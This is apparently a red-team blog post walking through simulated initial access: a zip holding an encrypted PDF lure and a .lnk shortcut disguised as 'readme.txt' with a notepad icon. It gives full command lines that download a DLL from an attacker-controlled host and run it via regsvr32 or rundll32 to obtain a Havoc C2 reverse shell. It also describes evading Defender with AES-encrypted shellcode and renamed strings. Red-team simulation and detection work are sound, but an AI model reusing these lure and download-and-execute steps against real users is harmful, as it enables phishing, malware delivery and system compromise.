---
title: "Initial Access Simulation" 
layout: "post"
---

In this specific scenario we will try to experiment and simulate a malware payload delivery using the following technique frequently used by Threat Actors (TA): 

- Zip Folder
- .LNK file execution
- DLL Execution 
- Havoc C2C comunications

We will discuss a simple, minimal and baseline approach and we will take into account fews considerations regarding the initial access aspects. 



In normal red team campain it is paramount to find a way to deliver the malicious payload and force the user to interact with our files. 
For this reason, in this particular scenario, we will try to simulate a .zip delivery containing two distinct file. 
The firs file inside the `.zip` will be an encrypted PDF document (sign contract, legal document, CV, just use your immagination), the second one will be a `.lnk` shortcut file masquerade as a text file (`readme.txt`). 
The idea here is the following: the user receive the files (could be via email or via MS Teams) and try to open up the encrypted pdf, which will ask the user to specify a password and then the user will open up the fake notepad file to recover the original PDF's password. 
By doint so the `.lnk` shortcut file in the background will execute the tasks necessary to deliver and execute our malicious DLL.  



## 1) Introduction Initial Access 

Initial Access involves a range of techniques employed by threat actors to establish their initial presence within a target network. 
These methods encompass various entry vectors that serve as a foothold into the network. 
One particularly relevant technique is the employment of targeted spear-phishing campaigns. 
In these campaigns, attackers meticulously craft deceptive emails tailored to deceive recipients, often leading them to unknowingly disclose sensitive credentials or execute malicious attachments. 

This tactic holds significant relevance as successful spear-phishing attempts can grant attackers direct access to a network, bypassing many traditional security measures. 
In addition, threat actors frequently exploit vulnerabilities present in public-facing web servers to penetrate the network's defenses. It's noteworthy that initial access points gained through these techniques could grant ongoing access, such as using compromised accounts and external remote services. 

However, the effectiveness of these access points might diminish due to changing passwords or other security measures. 
Analyzing historical attacks by prominent threat actors reveals that these tactics are recurrently employed to breach networks, underscoring the significance of robust initial access security measures."

In a recent [DarkGate Loader campain](https://www.truesec.com/hub/blog/darkgate-loader-delivered-via-teams) theat actors abused the Microsoft Teams tools to spread malware leveraging messages sent from two external Office 365 accounts compromised prior to the campaign. The message content aimed to social engineer the recipients into downloading and opening a malicious file hosted remotely.

 



## 2) Defender Bypass Payload

We are not going into details on how we created this stealth DLL payload in this blogpost. 
Is it obviously possible to used any payload you want, the only assumption is that the paylod itself must be undetected by Defender AV and static signature. 
The DLL itself is pretty simple and perform the classic injection using the VirtualAlloc Windows API. 
However, to bypass static signature, the shellcode is encrypted with AES, functions and relevant strings were renamed.
Inside the DLL we have also included the AES Key to decrypt the shellcode as well as the AES Decryption. Please note that in this case the AES Key is hardcoded inside the malware.  

__Note:__ Since we are saving a payload into the disk we don't need to worry about AMSI at this stage. We are not operating in memory even though this can be considered not OPSEC safe. 



## 3) Weaponize Payload Delivery with LNK 

Firt of all we need to create a shortcut file that will be delivered in the `zip` folder with the encrypted PDF. Right click on your Desktop, click on create shortcut and you must enter the full path of `cmd.exe`, in this case it will be `C:\Windows\System32\cmd.exe`. 

<p align="center">
  <img src="/assets/posts/2022-06-01-Initial-Access-Simulation/lnk.PNG">
</p>


After that we can specify readme.txt as a shortcut name. (remember we want the user to click on the shortcut file thinking it is a text file with the password to decrypt the PDF). Since we don't want to show the typical `cmd.exe` icon, which might look suspicious, we can then add a specific icon that in this specific case will be notepad. Now we need to click on the shortcut properties and changhe the icon to match to notepad.txt (default windows text editor). 


<p align="center">
  <img src="/assets/posts/2022-06-01-Initial-Access-Simulation/lnk2.PNG">
</p>

Now we can craft the powershell command to download the DLL from a remote location. This must be specified inside the shortcut target menu interface. Then we can specify the output where to save the `.dll` file. For this we will leverage the `%TMP%` environment variable of Windows so we don't even need to know the local user accoun name and path. 

The full command specified inside the shortcut file is the following: 

```powershell 
C:\Windows\System32\cmd.exe /c powershell.exe wget http://192.168.133.152:1234/h.dll -OutFile %TMP%\h.dll && regsvr32 %TMP%\h.dll 
```
__Note:__ The powershell download can be also be performed with the usual suspect IEX Download String function. 🚩

Furthermore, the above command is included inside the readme.txt.lnk file which will look like this to the end user. 

Below we can see the files that will be displayed to the user after unziping the `.zip` folder delivered via email or when possible via Microsft Teams. 

<p align="center">
  <img src="/assets/posts/2022-06-01-Initial-Access-Simulation/Invoice.PNG">
</p>

__Note:__ Obviously we can create a .lnk file with the desired command and subsequently add the typical pdf icon. 🚩

<p align="center">
  <img src="/assets/posts/2022-06-01-Initial-Access-Simulation/lnk3.PNG">
</p>



Upon executing the `readme.txt` file on the victim machine we can see a web request made on the attacker controlled webserver. 

<p align="center">
  <img src="/assets/posts/2022-06-01-Initial-Access-Simulation/down.JPG">
</p>

Furthermore, as soon as the file is downloaded and executed we can see our reverse shellcode in the Havoc C2C framework. 


<p align="center">
  <img src="/assets/posts/2022-06-01-Initial-Access-Simulation/hav1.JPG">
</p>

With some modification on the `.dll` file we can also perform the same activity using the `rundll32` windows binary. 


```powershell 
C:\Windows\System32\cmd.exe /c powershell.exe wget http://192.168.133.152:1234/h.dll -OutFile %TMP%\h.dll && rundll32 %TMP%\h.dll,helo
```
The command is pretty similar even though in this case we need to specify the export function name declared in our `.dll` (helo)

<video src="/assets/posts/2022-06-01-Initial-Access-Simulation/hvc1.mp4" controls="controls" style="max-width: 730px;">
</video>



## 4) Conclusion and Limitation


In a recent malware campaing analyzed by the Unit42 of Palo Alto corporation a threat acrors were identified abusing similar TTP's. Specifically, this sample was packaged as a self-contained ISO. Included in the ISO was a Windows shortcut (LNK) file, a malicious payload DLL and a legitimate copy of Microsoft OneDrive Updater. 

This unique sample was packaged in a manner consistent with known APT29 techniques and their recent campaigns, which leveraged well-known cloud storage and online collaboration applications. Specifically, this sample was packaged as a self-contained ISO. Included in the ISO was a Windows shortcut (LNK) file, a malicious payload DLL and a legitimate copy of Microsoft OneDrive Updater. Attempts to execute the benign application from the ISO-mounted folder resulted in the loading of the malicious payload as a dependency through a technique known as DLL search order hijacking. However, while packaging techniques alone are not enough to definitively attribute this sample to APT29, these techniques demonstrate that users of the tool are now applying nation-state tradecraft to deploy BRc4. 

For further reading you can refer to these two well detailed blog posts regarding APT 29 and their possibile relevant activities. 

- [Palo Alto](https://unit42.paloaltonetworks.com/brute-ratel-c4-tool/)
- [Yoroi](https://yoroi.company/research/how-an-apt-technique-turns-to-be-a-public-red-team-project/)



## References 

- https://www.truesec.com/hub/blog/darkgate-loader-delivered-via-teams

- PackMyPayload https://github.com/mgeeky/PackMyPayload